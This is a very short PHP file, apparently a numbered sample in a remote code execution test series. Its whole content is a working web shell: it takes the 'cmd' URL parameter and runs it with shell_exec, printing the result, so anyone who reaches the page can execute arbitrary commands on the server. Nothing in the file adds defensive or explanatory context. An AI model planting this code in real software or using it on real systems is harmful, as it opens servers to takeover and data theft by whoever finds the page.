<?php
// RCE test variation #873
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>